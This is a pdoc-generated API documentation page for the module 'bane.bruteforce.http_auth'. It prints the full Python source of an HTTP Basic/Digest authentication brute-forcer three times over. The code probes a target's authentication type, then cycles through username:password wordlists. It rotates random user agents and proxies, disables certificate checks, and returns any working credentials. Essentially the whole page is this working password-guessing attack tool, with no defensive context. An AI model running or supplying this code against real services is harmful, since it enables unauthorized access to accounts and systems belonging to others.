<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.bruteforce.http_auth</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.bruteforce.utils import *

class http_auth_bruteforce:
    __slots__ = [&#34;logs&#34;, &#34;stop&#34;, &#34;finish&#34;, &#34;result&#34;]

    def __init__(
        self,
        u,
        word_list=[],
        threads_daemon=True,
        logs=True,
        domain=None,
        proxy=None,
        proxies=None,
        cookie=None,
        user_agent=None,
        timeout=10,
        headers={}
    ):
        self.stop = False
        self.logs = logs
        self.finish = False
        self.result = {}
        t = threading.Thread(
            target=self.crack,
            args=(
                u,
                domain,
                word_list,
                logs,
                proxy,
                proxies,
                cookie,
                user_agent,
                timeout,
                headers,
            ),
        )
        t.daemon = threads_daemon
        t.start()

    def done(self):
        return self.finish

    def crack(
        self, u, domain, word_list, logs, proxy, proxies, cookie, user_agent, timeout,headers
    ):
        if user_agent:
            us = user_agent
        else:
            us = random.choice(ua)
        hed = {&#34;User-Agent&#34;: us}
        if cookie:
            hed.update({&#34;Cookie&#34;: cookie})
        hed.update(headers)
        prox = None
        if proxy:
            prox = proxy#{&#34;http&#34;: &#34;http://&#34; + proxy, &#34;https&#34;: &#34;http://&#34; + proxy}
        if proxies:
            prox = random.choice(proxies)
            #prox = {&#34;http&#34;: &#34;http://&#34; + prox, &#34;https&#34;: &#34;http://&#34; + prox}
        try:
            if self.logs == True:
                print(&#34;[*]Checking Authentication Type:&#34;)
            resp = requests.Session().get(
                u, proxies=prox, headers=hed, verify=False, timeout=timeout
            )
            if &#34;basic&#34; in resp.headers[&#34;WWW-Authenticate&#34;].lower():
                if self.logs == True:
                    print(&#34;==&gt;Basic&#34;)
                auth_type = requests.auth.HTTPBasicAuth
            elif &#34;digest&#34; in resp.headers[&#34;WWW-Authenticate&#34;].lower():
                if self.logs == True:
                    print(&#34;==&gt;Digest&#34;)
                auth_type = requests.auth.HTTPDigestAuth
                &#34;&#34;&#34;elif &#39;ntlm&#39; in resp.headers[&#39;WWW-Authenticate&#39;].lower():
    if self.logs==True:
     print(&#34;==&gt;Ntlm&#34;)
    auth_type = requests_ntlm.HttpNtlmAuth
    if not domain:
     raise Exception(&#39;You need to specify a domain for &#34;Ntlm&#34; authentication !\n\nbane.http_auth_bruteforce(&#34;http://example.com&#34;,domain=&#34;example.com&#34;,.....)&#39;)&#34;&#34;&#34;
            else:
                if self.logs == True:
                    print(&#34;==&gt;Unknown type&#34;)
                self.finish = True
                return
        except:
            if self.logs == True:
                print(&#34;bane doesn&#39;t support this type of authentication&#34;)
            self.finish = True
            return
        for x in word_list:
            try:
                if self.stop == True:
                    self.finish = True
                    break
                username = x.split(&#34;:&#34;)[0]
                &#34;&#34;&#34;if domain and auth_type==requests_ntlm.HttpNtlmAuth:
     username=domain+&#39;\\&#39;+username&#34;&#34;&#34;
                password = x.split(&#34;:&#34;)[1]
                if self.logs == True:
                    print(&#34;[*]Trying: {} {}&#34;.format(username, password))
                prox = None
                if proxies:
                    prox = random.choice(proxies)
                if user_agent:
                    us = user_agent
                else:
                    us = random.choice(ua)
                hed = {&#34;User-Agent&#34;: us}
                if cookie:
                    hed.update({&#34;Cookie&#34;: cookie})
                r = requests.Session().get(
                    u,
                    auth=auth_type(username, password),
                    proxies=prox,
                    headers=hed,
                    verify=False,
                    timeout=timeout,
                )
                if (
                    (r.status_code == 200)
                    and (&#34;required&#34; not in r.text.lower())
                    and (&#34;wrong&#34; not in r.text.lower())
                    and (&#34;invalid&#34; not in r.text.lower())
                    and (&#34;denied&#34; not in r.text.lower())
                    and (&#34;unauthorized&#34; not in r.text.lower())
                ):
                    if self.logs == True:
                        print(&#34;[+]Success&#34;)
                    self.result = {u: username + &#34;:&#34; + password}
                    self.finish = True
                    break
                else:
                    if self.logs == True:
                        print(&#34;[-]Fail&#34;)
            except Exception as ex:
                if self.logs == True:
                    print(&#34;[-]Fail&#34;)
        self.finish = True</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce"><code class="flex name class">
<span>class <span class="ident">http_auth_bruteforce</span></span>
<span>(</span><span>u, word_list=[], threads_daemon=True, logs=True, domain=None, proxy=None, proxies=None, cookie=None, user_agent=None, timeout=10, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class http_auth_bruteforce:
    __slots__ = [&#34;logs&#34;, &#34;stop&#34;, &#34;finish&#34;, &#34;result&#34;]

    def __init__(
        self,
        u,
        word_list=[],
        threads_daemon=True,
        logs=True,
        domain=None,
        proxy=None,
        proxies=None,
        cookie=None,
        user_agent=None,
        timeout=10,
        headers={}
    ):
        self.stop = False
        self.logs = logs
        self.finish = False
        self.result = {}
        t = threading.Thread(
            target=self.crack,
            args=(
                u,
                domain,
                word_list,
                logs,
                proxy,
                proxies,
                cookie,
                user_agent,
                timeout,
                headers,
            ),
        )
        t.daemon = threads_daemon
        t.start()

    def done(self):
        return self.finish

    def crack(
        self, u, domain, word_list, logs, proxy, proxies, cookie, user_agent, timeout,headers
    ):
        if user_agent:
            us = user_agent
        else:
            us = random.choice(ua)
        hed = {&#34;User-Agent&#34;: us}
        if cookie:
            hed.update({&#34;Cookie&#34;: cookie})
        hed.update(headers)
        prox = None
        if proxy:
            prox = proxy#{&#34;http&#34;: &#34;http://&#34; + proxy, &#34;https&#34;: &#34;http://&#34; + proxy}
        if proxies:
            prox = random.choice(proxies)
            #prox = {&#34;http&#34;: &#34;http://&#34; + prox, &#34;https&#34;: &#34;http://&#34; + prox}
        try:
            if self.logs == True:
                print(&#34;[*]Checking Authentication Type:&#34;)
            resp = requests.Session().get(
                u, proxies=prox, headers=hed, verify=False, timeout=timeout
            )
            if &#34;basic&#34; in resp.headers[&#34;WWW-Authenticate&#34;].lower():
                if self.logs == True:
                    print(&#34;==&gt;Basic&#34;)
                auth_type = requests.auth.HTTPBasicAuth
            elif &#34;digest&#34; in resp.headers[&#34;WWW-Authenticate&#34;].lower():
                if self.logs == True:
                    print(&#34;==&gt;Digest&#34;)
                auth_type = requests.auth.HTTPDigestAuth
                &#34;&#34;&#34;elif &#39;ntlm&#39; in resp.headers[&#39;WWW-Authenticate&#39;].lower():
    if self.logs==True:
     print(&#34;==&gt;Ntlm&#34;)
    auth_type = requests_ntlm.HttpNtlmAuth
    if not domain:
     raise Exception(&#39;You need to specify a domain for &#34;Ntlm&#34; authentication !\n\nbane.http_auth_bruteforce(&#34;http://example.com&#34;,domain=&#34;example.com&#34;,.....)&#39;)&#34;&#34;&#34;
            else:
                if self.logs == True:
                    print(&#34;==&gt;Unknown type&#34;)
                self.finish = True
                return
        except:
            if self.logs == True:
                print(&#34;bane doesn&#39;t support this type of authentication&#34;)
            self.finish = True
            return
        for x in word_list:
            try:
                if self.stop == True:
                    self.finish = True
                    break
                username = x.split(&#34;:&#34;)[0]
                &#34;&#34;&#34;if domain and auth_type==requests_ntlm.HttpNtlmAuth:
     username=domain+&#39;\\&#39;+username&#34;&#34;&#34;
                password = x.split(&#34;:&#34;)[1]
                if self.logs == True:
                    print(&#34;[*]Trying: {} {}&#34;.format(username, password))
                prox = None
                if proxies:
                    prox = random.choice(proxies)
                if user_agent:
                    us = user_agent
                else:
                    us = random.choice(ua)
                hed = {&#34;User-Agent&#34;: us}
                if cookie:
                    hed.update({&#34;Cookie&#34;: cookie})
                r = requests.Session().get(
                    u,
                    auth=auth_type(username, password),
                    proxies=prox,
                    headers=hed,
                    verify=False,
                    timeout=timeout,
                )
                if (
                    (r.status_code == 200)
                    and (&#34;required&#34; not in r.text.lower())
                    and (&#34;wrong&#34; not in r.text.lower())
                    and (&#34;invalid&#34; not in r.text.lower())
                    and (&#34;denied&#34; not in r.text.lower())
                    and (&#34;unauthorized&#34; not in r.text.lower())
                ):
                    if self.logs == True:
                        print(&#34;[+]Success&#34;)
                    self.result = {u: username + &#34;:&#34; + password}
                    self.finish = True
                    break
                else:
                    if self.logs == True:
                        print(&#34;[-]Fail&#34;)
            except Exception as ex:
                if self.logs == True:
                    print(&#34;[-]Fail&#34;)
        self.finish = True</code></pre>
</details>
<h3>Instance variables</h3>
<dl>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce.finish"><code class="name">var <span class="ident">finish</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce.logs"><code class="name">var <span class="ident">logs</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce.result"><code class="name">var <span class="ident">result</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce.stop"><code class="name">var <span class="ident">stop</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
</dl>
<h3>Methods</h3>
<dl>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce.crack"><code class="name flex">
<span>def <span class="ident">crack</span></span>(<span>self, u, domain, word_list, logs, proxy, proxies, cookie, user_agent, timeout, headers)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def crack(
    self, u, domain, word_list, logs, proxy, proxies, cookie, user_agent, timeout,headers
):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    prox = None
    if proxy:
        prox = proxy#{&#34;http&#34;: &#34;http://&#34; + proxy, &#34;https&#34;: &#34;http://&#34; + proxy}
    if proxies:
        prox = random.choice(proxies)
        #prox = {&#34;http&#34;: &#34;http://&#34; + prox, &#34;https&#34;: &#34;http://&#34; + prox}
    try:
        if self.logs == True:
            print(&#34;[*]Checking Authentication Type:&#34;)
        resp = requests.Session().get(
            u, proxies=prox, headers=hed, verify=False, timeout=timeout
        )
        if &#34;basic&#34; in resp.headers[&#34;WWW-Authenticate&#34;].lower():
            if self.logs == True:
                print(&#34;==&gt;Basic&#34;)
            auth_type = requests.auth.HTTPBasicAuth
        elif &#34;digest&#34; in resp.headers[&#34;WWW-Authenticate&#34;].lower():
            if self.logs == True:
                print(&#34;==&gt;Digest&#34;)
            auth_type = requests.auth.HTTPDigestAuth
            &#34;&#34;&#34;elif &#39;ntlm&#39; in resp.headers[&#39;WWW-Authenticate&#39;].lower():
if self.logs==True:
 print(&#34;==&gt;Ntlm&#34;)
auth_type = requests_ntlm.HttpNtlmAuth
if not domain:
 raise Exception(&#39;You need to specify a domain for &#34;Ntlm&#34; authentication !\n\nbane.http_auth_bruteforce(&#34;http://example.com&#34;,domain=&#34;example.com&#34;,.....)&#39;)&#34;&#34;&#34;
        else:
            if self.logs == True:
                print(&#34;==&gt;Unknown type&#34;)
            self.finish = True
            return
    except:
        if self.logs == True:
            print(&#34;bane doesn&#39;t support this type of authentication&#34;)
        self.finish = True
        return
    for x in word_list:
        try:
            if self.stop == True:
                self.finish = True
                break
            username = x.split(&#34;:&#34;)[0]
            &#34;&#34;&#34;if domain and auth_type==requests_ntlm.HttpNtlmAuth:
 username=domain+&#39;\\&#39;+username&#34;&#34;&#34;
            password = x.split(&#34;:&#34;)[1]
            if self.logs == True:
                print(&#34;[*]Trying: {} {}&#34;.format(username, password))
            prox = None
            if proxies:
                prox = random.choice(proxies)
            if user_agent:
                us = user_agent
            else:
                us = random.choice(ua)
            hed = {&#34;User-Agent&#34;: us}
            if cookie:
                hed.update({&#34;Cookie&#34;: cookie})
            r = requests.Session().get(
                u,
                auth=auth_type(username, password),
                proxies=prox,
                headers=hed,
                verify=False,
                timeout=timeout,
            )
            if (
                (r.status_code == 200)
                and (&#34;required&#34; not in r.text.lower())
                and (&#34;wrong&#34; not in r.text.lower())
                and (&#34;invalid&#34; not in r.text.lower())
                and (&#34;denied&#34; not in r.text.lower())
                and (&#34;unauthorized&#34; not in r.text.lower())
            ):
                if self.logs == True:
                    print(&#34;[+]Success&#34;)
                self.result = {u: username + &#34;:&#34; + password}
                self.finish = True
                break
            else:
                if self.logs == True:
                    print(&#34;[-]Fail&#34;)
        except Exception as ex:
            if self.logs == True:
                print(&#34;[-]Fail&#34;)
    self.finish = True</code></pre>
</details>
</dd>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce.done"><code class="name flex">
<span>def <span class="ident">done</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def done(self):
    return self.finish</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.bruteforce" href="index.md">bane.bruteforce</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce" href="#bane.bruteforce.http_auth.http_auth_bruteforce">http_auth_bruteforce</a></code></h4>
<ul class="two-column">
<li><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce.crack" href="#bane.bruteforce.http_auth.http_auth_bruteforce.crack">crack</a></code></li>
<li><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce.done" href="#bane.bruteforce.http_auth.http_auth_bruteforce.done">done</a></code></li>
<li><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce.finish" href="#bane.bruteforce.http_auth.http_auth_bruteforce.finish">finish</a></code></li>
<li><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce.logs" href="#bane.bruteforce.http_auth.http_auth_bruteforce.logs">logs</a></code></li>
<li><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce.result" href="#bane.bruteforce.http_auth.http_auth_bruteforce.result">result</a></code></li>
<li><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce.stop" href="#bane.bruteforce.http_auth.http_auth_bruteforce.stop">stop</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>